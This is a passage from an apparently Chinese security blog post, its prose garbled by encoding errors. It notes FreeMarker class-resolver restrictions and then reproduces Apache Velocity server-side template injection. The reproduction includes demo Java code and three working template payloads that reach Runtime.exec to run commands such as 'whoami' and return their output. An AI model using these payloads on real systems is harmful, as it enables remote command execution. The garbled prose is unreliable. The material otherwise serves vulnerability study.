<strong>2.3.17</strong>ç‰ˆæœ¬ä»¥åï¼Œå®˜æ–¹ç‰ˆæœ¬æä¾›äº†ä¸‰ç§TemplateClassResolverå¯¹ç±»è¿›è¡Œè§£æï¼š</p><ol><li><p>UNRESTRICTED_RESOLVERï¼šå¯ä»¥é€šè¿‡ <code>ClassUtil.forName(className)</code> è·å–ä»»ä½•ç±»ã€‚</p></li><li><p>SAFER_RESOLVERï¼šä¸èƒ½åŠ è½½ <code>freemarker.template.utility.JythonRuntime</code>ã€<code>freemarker.template.utility.Execute</code>ã€<code>freemarker.template.utility.ObjectConstructor</code>è¿™ä¸‰ä¸ªç±»ã€‚</p></li><li><p>ALLOWS_NOTHING_RESOLVERï¼šä¸èƒ½è§£æä»»ä½•ç±»ã€‚</p></li></ol><p>å¯é€šè¿‡<code>freemarker.core.Configurable#setNewBuiltinClassResolver</code>æ–¹æ³•è®¾ç½®<code>TemplateClassResolver</code>ï¼Œä»è€Œé™åˆ¶é€šè¿‡<code>new()</code>å‡½æ•°å¯¹<code>freemarker.template.utility.JythonRuntime</code>ã€<code>freemarker.template.utility.Execute</code>ã€<code>freemarker.template.utility.ObjectConstructor</code>è¿™ä¸‰ä¸ªç±»çš„è§£æã€‚</p><h2 id="Velocity-SSTI"><a href="#Velocity-SSTI" class="headerlink" title="Velocity SSTI"></a>Velocity SSTI</h2><p>ä¸»è¦å‚è€ƒï¼š<a href="https://www.cnblogs.com/LittleHann/p/17846825.html#_lab2_0_5">Javaæ¨¡ç‰ˆå¼•æ“æ³¨å…¥ï¼ˆSSTIï¼‰æ¼æ´ç ”ç©¶ - éƒ‘ç€š - åšå®¢å›­ (cnblogs.com)</a></p><p>â€‹  <a href="https://garck3h.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#evaluate%E8%A7%A6%E5%8F%91">velocityçš„SSTIå¤ç°ä¸åˆ†æ (garck3h.github.io)</a></p><h3 id="VelocityåŸºæœ¬è¯­æ³•"><a href="#VelocityåŸºæœ¬è¯­æ³•" class="headerlink" title="VelocityåŸºæœ¬è¯­æ³•"></a>VelocityåŸºæœ¬è¯­æ³•</h3><p><code>#</code> å…³é”®å­—<br>Velocityå…³é”®å­—éƒ½æ˜¯ä½¿ç”¨ <code>#</code>å¼€å¤´çš„ï¼Œå¦‚ <code>#set</code>ã€<code>#if</code>ã€<code>#else</code>ã€<code>#end</code>ã€<code>#foreach</code> ç­‰<br><code>$</code>å˜é‡<br>Velocityå˜é‡éƒ½æ˜¯ä½¿ç”¨$å¼€å¤´çš„ï¼Œå¦‚ï¼š<code>$name</code>ã€<code>$msg</code><br><code>&#123;&#125;</code>å˜é‡<br>Velocityå¯¹äºéœ€è¦æ˜ç¡®è¡¨ç¤ºçš„Velocityå˜é‡ï¼Œå¯ä»¥ä½¿ç”¨ <code>&#123;&#125;</code> å°†å˜é‡åŒ…å«èµ·æ¥ã€‚<br><code>ï¼</code>å˜é‡<br>å¦‚æœæŸä¸ªVelocityå˜é‡ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆé¡µé¢ä¸­å°±ä¼šæ˜¾ç¤º<code>$xxx</code>çš„å½¢å¼ï¼Œä¸ºäº†é¿å…è¿™ç§å½¢å¼ï¼Œå¯ä»¥åœ¨å˜é‡åç§°å‰åŠ ä¸Šï¼ã€‚å¦‚é¡µé¢ä¸­å«æœ‰<code>$msg</code>ï¼Œå¦‚æœmsgæœ‰å€¼ï¼Œå°†æ˜¾ç¤ºmsgçš„å€¼ï¼›å¦‚æœä¸å­˜åœ¨å°±ä¼šæ˜¾ç¤º<code>$msg</code>ã€‚è¿™æ˜¯æˆ‘ä»¬ä¸å¸Œæœ›çœ‹åˆ°çš„ï¼Œä¸ºäº†æŠŠä¸å­˜åœ¨çš„å˜é‡æ˜¾ç¤ºä¸ºç©ºç™½ï¼Œå¯ä»¥ä½¿ç”¨<code>$!msg</code>ã€‚</p><p>æ­¤å¤„çš„æ”»å‡»é¢è¿˜æ˜¯ä»¥æ–‡ä»¶ä¸Šä¼ å’Œæ¨¡æ¿ç¼–å†™ä¸ºä¸»</p><h3 id="Velocity-SSTIæ¼æ´é£é™©é¢poc"><a href="#Velocity-SSTIæ¼æ´é£é™©é¢poc" class="headerlink" title="Velocity SSTIæ¼æ´é£é™©é¢poc"></a>Velocity SSTIæ¼æ´é£é™©é¢poc</h3><h4 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h4><h5 id="webç¨‹åºä¸­å¼¹å‡ºmsg"><a href="#webç¨‹åºä¸­å¼¹å‡ºmsg" class="headerlink" title="webç¨‹åºä¸­å¼¹å‡ºmsg"></a>webç¨‹åºä¸­å¼¹å‡ºmsg</h5><p>å†™ä¸€ä¸ªDemo</p><p>æ–°å»ºä¸€ä¸ªMavené¡¹ç›®ï¼Œå¼•å…¥Velocityä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.velocity<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>velocity-engine-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>           <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨resourceç›®å½•ä¸‹åˆ›å»ºæ¨¡æ¿æ–‡ä»¶ï¼Œä»¥.vmåç¼€å‘½å</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>hello , $&#123;name&#125; !<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸»ç¨‹åº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.Template;<br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 1ã€è®¾ç½®velocityèµ„æºåŠ è½½å™¨</span><br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        prop.put(<span class="hljs-string">&quot;file.resource.loader.class&quot;</span>, <span class="hljs-string">&quot;org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader&quot;</span>);<br>        <span class="hljs-comment">// 2ã€åˆå§‹åŒ–velocityå¼•æ“</span><br>        Velocity.init(prop);<br>        <span class="hljs-comment">// 3ã€åˆ›å»ºvelocityå®¹å™¨</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        <span class="hljs-comment">// å‘å®¹å™¨ä¸­æ”¾å…¥æ•°æ®</span><br>        context.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;å¤–éƒ¨è¾“å…¥çš„æ¶ˆæ¯&quot;</span>);<br>        <span class="hljs-comment">// 4ã€åŠ è½½velocityæ¨¡æ¿</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">tpl</span> <span class="hljs-operator">=</span> Velocity.getTemplate(<span class="hljs-string">&quot;vms/velocityDemo.vm&quot;</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-comment">// 5ã€åˆå¹¶æ•°æ®åˆ°æ¨¡æ¿</span><br>        <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;src/main/resources/velocityDemo.html&quot;</span>);<br>        tpl.merge(context, fw);<br>        <span class="hljs-comment">// 6ã€é‡Šæ”¾èµ„æº</span><br>        fw.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¨¡æ¿æ–‡ä»¶</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    #if($msg)<br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;$!msg&#x27;</span>);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>    #end<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œä¸»ç¨‹åºåå¯ä»¥çœ‹åˆ°æ¨¡æ¿æˆåŠŸæ³¨å…¥ï¼Œä¸»ç¨‹åºå°†å‰å°é¡µé¢çš„æ˜¾ç¤ºå†™åœ¨htmlæ–‡ä»¶ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ç½‘é¡µä¼šå¼¹å‡ºæ¶ˆæ¯</p><p><img src="/img/ssti(java)/ssti18.png"></p><h5 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h5><h6 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    #set($e=&quot;e&quot;)<br>$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;Calc&quot;)<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>macå‘½ä»¤ä¸ºopen -a Calculator</p><p>è¿è¡Œä¸»ç¨‹åºåçœ‹åˆ°æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/img/ssti(java)/ssti19.png"></p><h6 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    #set($x=&#x27;&#x27;)##<br>#set($rt = $x.class.forName(&#x27;java.lang.Runtime&#x27;))##<br>#set($chr = $x.class.forName(&#x27;java.lang.Character&#x27;))##<br>#set($str = $x.class.forName(&#x27;java.lang.String&#x27;))##<br>#set($ex=$rt.getRuntime().exec(&#x27;whoami&#x27;))##<br>$ex.waitFor()<br>#set($out=$ex.getInputStream())##<br>#foreach( $i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ³¨å…¥å‘½ä»¤éœ€è¦ç½‘é¡µæœ‰å›æ˜¾ä½ï¼Œæˆ–è€…å°†å›æ˜¾æ•°æ®æ³¨å…¥åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­</p><p>å¦‚æ­¤å¤„æ„é€ ä¸»ç¨‹åºä¼šåˆå¹¶æ•°æ®åˆ°æ¨¡æ¿</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;src/main/resources/velocityDemo.html&quot;</span>);<br>tpl.merge(context, fw);<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°å›æ˜¾</p><p><img src="/img/ssti(java)/ssti20.png"></p><h6 id="poc3"><a href="#poc3" class="headerlink" title="poc3"></a>poc3</h6><p>æ§åˆ¶ç¨‹åºä¸­æœ‰æ‰§è¡Œå‘½ä»¤è¯­å¥ï¼Œç¼–å†™pocè®©å…¶æ‰§è¡Œå¹¶è¾“å‡ºæ•°æ®</p><p>ä¸»ç¨‹åº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.Template;<br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Date;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 1ã€è®¾ç½®velocityèµ„æºåŠ è½½å™¨</span><br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        prop.put(<span class="hljs-string">&quot;file.resource.loader.class&quot;</span>, <span class="hljs-string">&quot;org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader&quot;</span>);<br>        <span class="hljs-comment">// 2ã€åˆå§‹åŒ–velocityå¼•æ“</span><br>        Velocity.init(prop);<br>        <span class="hljs-comment">// 3ã€åˆ›å»ºvelocityå®¹å™¨</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        <span class="hljs-comment">// å‘å®¹å™¨ä¸­æ”¾å…¥æ•°æ®</span><br>        context.put(<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>);<br>        <span class="hljs-comment">// 4ã€åŠ è½½velocityæ¨¡æ¿</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">tpl</span> <span class="hljs-operator">=</span> Velocity.getTemplate(<span class="hljs-string">&quot;vms/velocityDemo.vm&quot;</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        <span class="hljs-comment">// 5ã€åˆå¹¶æ•°æ®åˆ°æ¨¡æ¿</span><br>        <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;/Users/zhenghan/Projects/Velocity_test/src/main/resources/velocityDemo.html&quot;</span>);<br>        tpl.merge(context, fw);<br>        <span class="hljs-comment">// 6ã€é‡Šæ”¾èµ„æº</span><br>        fw.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¨¡æ¿æ–‡ä»¶</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    #set ($e=&quot;exp&quot;)<br>#set ($a=$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($cmd))<br>#set ($input=$e.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))<br>#set($sc = $e.getClass().forName(&quot;java.util.Scanner&quot;))<br>#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(&quot;java.io.InputStream&quot;)))<br>#set($scan=$constructor.newInstance($input).useDelimiter(&quot;/A&quot;))<br>#if($scan.hasNext())<br>    $scan.next()<br>#end<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œä¸»ç¨‹åºåçœ‹åˆ°å›æ˜¾æ•°æ®</p><p><img src="/img/ssti(java)/ssti21.png"></p><h4 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><h5 id="evaluateè§¦å‘"><a href="#evaluateè§¦å‘" class="headerlink" title="evaluateè§¦å‘"></a>evaluateè§¦å‘</h5><p>evaluateæ–¹æ³•ä½¿ç”¨VelocityEngineçš„evaluateæ–¹æ³•æ¥æ‰§è¡ŒVelocityæ¨¡æ¿çš„è¯„ä¼°ã€‚ç”¨æˆ·è¾“å…¥é€šè¿‡HttpServletRequestå¯¹è±¡è·å–ï¼Œå¹¶æ”¾å…¥VelocityContextä¸­è¿›è¡Œæ¸²æŸ“ã€‚</p><p>æ¥ä¸‹æ¥ç®€å•åˆ†æä¸€ä¸‹velocityå­˜åœ¨æ¼æ´çš„é£é™©ä»£ç åŸç†</p><p>ä¸»ç¨‹åº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;å¤–éƒ¨æ”»å‡»è€…å¯æ§è¾“å…¥&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">templateString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello, &quot;</span> + username + <span class="hljs-string">&quot; | Full name: $name, phone: $phone, email: $email&quot;</span>;<br><span class="hljs-comment">//åˆå§‹åŒ–velocityå¼•æ“</span><br>        Velocity.init();<br>        <span class="hljs-comment">//åˆ›å»ºvelocityå®¹å™¨</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        <span class="hljs-comment">//å‘å®¹å™¨ä¸­æ”¾å…¥æ•°æ®</span><br>        ctx.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;Little Hann&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;phone&quot;</span>, <span class="hljs-string">&quot;123456789&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;email&quot;</span>, <span class="hljs-string">&quot;zhenghan.zh@alibaba-inc.com&quot;</span>);<br><br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>        <span class="hljs-comment">// å°†æ¨¡æ¿å­—ç¬¦ä¸²å’Œä¸Šä¸‹æ–‡å¯¹è±¡ä¼ é€’ç»™Velocityå¼•æ“è¿›è¡Œè§£æå’Œæ¸²æŸ“</span><br>        Velocity.evaluate(ctx, out, <span class="hljs-string">&quot;test&quot;</span>, templateString);<br><br>        <span class="hljs-comment">// è¾“å‡ºvelocityæ¸²æŸ“ç»“æœ</span><br>        System.out.println(out.toString());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¨¡æ‹Ÿæ³¨å…¥æ”»å‡»</p><p>å°†payloadä¼ å…¥username</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 